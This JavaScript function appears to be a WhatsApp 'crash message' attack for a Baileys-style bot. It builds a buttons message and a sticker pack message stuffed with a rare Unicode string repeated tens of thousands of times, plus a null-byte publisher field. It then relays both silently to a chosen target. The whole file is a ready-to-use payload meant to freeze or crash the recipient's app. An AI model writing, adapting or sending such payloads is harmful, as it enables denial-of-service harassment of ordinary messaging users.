async function ExZiVi(sock, target) {
  const Msg = {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          contentText: "170 subs",
          footerText: "𝐗𝐳𝐕-𝐄𝐱𝐩𝐳𝐂",
          headerType: 1,
          buttons: [
            { 
              buttonId: 'ExpzC_One', 
              buttonText: { displayText: '𑇂𑆵𑆵𑆴𑆿𑆴𑆿'.repeat(10000) }, 
              type: 1 
            },
            { 
              buttonId: 'ExpzC_Two', 
              buttonText: { displayText: '𑇂𑆵𑆵𑆴𑆿𑆴𑆿'.repeat(10000) }, 
              type: 1 
            }
          ]
        }
      }
    }
  };
var XzMess = {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
          name: "𑇂𑆵𑆵𑆴𑆿𑆴𑆿".repeat(30000),
          publisher: "\0",
          stickers: [],
          fileLength: "3662919",
          fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
          fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
          mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
          directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
          contextInfo: {
            remoteJid: "X",
            participant: "0@s.whatsapp.net",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: ["13135550202@s.whatsapp.net"]
          },
          packDescription: "",
          mediaKeyTimestamp: "1747502082",
          trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
          thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
          thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
          thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
          stickerPackSize: "3680054",
          stickerPackOrigin: "USER_CREATED"
        }
      }
    }
  };
  try {
    await sock.relayMessage(
      target, 
      XzMess, 
      {
        XzVself: true
      });
    await sock.relayMessage(
      target, 
      Msg,
      {
        XzVself: true
      });
  } catch (e) {
  }
}
